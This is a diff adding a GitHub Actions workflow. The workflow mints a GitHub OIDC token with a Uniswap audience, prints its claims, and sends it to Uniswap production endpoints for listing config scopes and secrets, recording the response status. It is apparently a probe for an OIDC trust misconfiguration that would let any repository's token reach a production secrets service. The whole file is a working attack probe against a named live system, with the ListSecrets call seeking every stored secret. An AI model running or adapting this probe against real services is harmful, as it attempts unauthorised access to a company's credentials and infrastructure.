@@ -1,0 +1,22 @@
+name: oidc-aud-test
+on: workflow_dispatch
+permissions:
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Mint token and probe
+        run: |
+          JWT=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https%3A%2F%2Funiswap.org" | jq -r '.value')
+          echo "=== identity we are presenting ==="
+          python3 -c "import sys,base64,json;p=sys.argv[1].split('.')[1];p+='='*(-len(p)%4);d=json.loads(base64.urlsafe_b64decode(p));print(json.dumps({k:d.get(k) for k in ['iss','aud','sub','repository']},indent=1))" "$JWT"
+          echo "=== ConfigService/ListScopes ==="
+          curl -s -o /dev/null -w 'status=%{http_code}\n' -X POST \
+            https://entry-gateway.backend-prod.api.uniswap.org/configservice.v1.ConfigService/ListScopes \
+            -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' -d '{}'
+          echo "=== SecretsService/ListSecrets ==="
+          curl -s -o /dev/null -w 'status=%{http_code}\n' -X POST \
+            https://entry-gateway.backend-prod.api.uniswap.org/configservice.v1.SecretsService/ListSecrets \
+            -H "Authorization: Bearer $JWT" -H 'Content-Type: application/json' -d '{"prefix":""}'
